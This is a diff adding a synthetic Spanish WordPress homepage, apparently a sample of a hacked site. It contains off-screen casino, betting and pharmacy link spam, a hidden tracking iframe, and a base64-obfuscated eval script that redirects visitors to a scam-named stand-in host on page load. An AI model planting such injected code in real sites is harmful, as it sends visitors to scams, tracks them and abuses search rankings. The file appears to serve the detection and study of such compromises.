@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="es"><head><meta charset="utf-8"><title>Entidad de ejemplo · Inicio</title>
+<meta name="generator" content="WordPress 6.2.1">
+<link rel="stylesheet" href="https://ejemplo-entidad.invalid/wp-content/plugins/elementor/assets/css/frontend.css?ver=3.1">
+<script src="https://ejemplo-entidad.invalid/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4"></script>
+</head><body>
+<!-- EJEMPLO SINTÉTICO: reproduce patrones reales de spam SEO con dominios inventados (.invalid) -->
+<header><h1>Entidad de ejemplo</h1><nav><a href="/resultados/">Resultados</a> · <a href="/contacto/">Contacto</a></nav></header>
+<main><p>Bienvenidos al sitio oficial. Consulte aquí los resultados y noticias.</p></main>
+<div style="position: absolute;left: -7449px;top: -6026px"><h2>Exploring Casino Bonuses and Promotions</h2>
+<p>At <a href="https://bonos-casino-ejemplo.invalid/">Casino Ejemplo</a>, players get free spins and casino bonus codes. The best slots and poker in one casino.</p></div>
+<div style="position: absolute;left: -5887px;top: -9418px"><p>Juega en <a href="https://slots-ejemplo.casino/">las mejores slots</a> con apuestas seguras y casino en vivo. Casino, casino, casino.</p></div>
+<div style="position: absolute;left: -8850px;top: -5322px"><p>Read about <a href="https://apuestas-ejemplo.bet/">betting</a> and <a href="https://farmacia-ejemplo.invalid/">pharmacy</a> deals. Casino tips, casino reviews, slots.</p></div>
+<script>eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9lc3RhZmEtZWplbXBsby5pbnZhbGlkLyI="))</script>
+<iframe src="https://rastreo-ejemplo.invalid/px" width="1" height="1" style="display:none"></iframe>
+</body></html>
